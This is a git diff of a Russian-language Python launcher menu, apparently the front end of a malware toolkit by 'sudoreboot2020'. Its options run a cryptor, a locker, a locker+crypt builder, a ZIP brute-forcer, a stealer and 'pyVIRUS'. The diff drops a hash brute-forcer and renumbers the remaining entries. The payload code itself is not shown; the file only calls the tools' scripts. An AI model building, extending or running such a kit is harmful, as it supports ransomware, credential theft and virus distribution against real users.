@@ -16,12 +16,11 @@ print('\r\n\033[33m Автор:sudoreboot2020')
 print("""\033[33m
 Выберите утилиту:
 [1] - cryptor
-[2] - brutehash
-[3] - locker
-[4] - locker+crypt
-[5] - bruteZIP
-[6] - stealer
-[7] - pyVIRUS
+[2] - locker
+[3] - locker+crypt
+[4] - bruteZIP
+[5] - stealer
+[6] - pyVIRUS
 [99] - ВЫХОД
 """)
 while True:
@@ -31,26 +30,22 @@ while True:
         os.system('clear')
         os.system('python3 shifrovalshik.py')
     elif a ==('2'):
-        os.chdir('brutehash')
-        os.system('clear')
-        os.system('python3 brutehash.py')
-    elif a ==('3'):
         os.chdir('locker')
         os.system('clear')
         os.system('python3 locker.py')
-    elif a ==('4'):
+    elif a ==('3'):
         os.chdir('locker+crypt')
         os.system('clear')
         os.system('python3 builder_cl.py')
-    elif a ==('5'):
+    elif a ==('4'):
         os.chdir('bruteZIP')
         os.system('clear')
         os.system('python3 brutezip.py')
-    elif a ==('6'):
+    elif a ==('5'):
         os.chdir('stealer')
         os.system('clear')
         os.system('MAINstealer.py')
-    elif a ==('7'):
+    elif a ==('6'):
         os.chdir('pyVIRUS')
         os.system('clear')
         os.system('python3 pyvirus.py')
